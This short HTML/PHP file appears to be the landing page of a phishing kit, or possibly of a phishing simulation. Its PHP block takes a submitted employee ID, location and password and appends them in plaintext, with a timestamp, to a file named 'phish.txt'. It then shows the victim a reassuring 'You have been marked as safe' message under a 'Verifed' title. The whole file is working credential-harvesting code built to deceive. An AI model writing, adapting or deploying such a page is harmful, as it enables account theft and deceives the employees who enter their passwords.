<!DOCTYPE html>
<html lang="">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Verifed</title>
</head>

<body>
    
<?php
    $time = date("h:i:sa");
    $day = date("Y-m-d");
    $file = fopen("phish.txt", "a");
    $txt = 
        "\nEmployee ID: ".$_POST['id']." | Location: ".$_POST['location']." | Password: ".$_POST['password']." | Time of data entry: ".$day." at ".$time;
        
    fwrite($file, $txt);
    fclose($file);
    ?>

    
    <img src="verified.png" style="float:left;width:42px;height:42px;">
    <p>You have been marked as <b>safe</b>. Please continue to check your email for any other alerts or updates.</p>

</body>
</html>
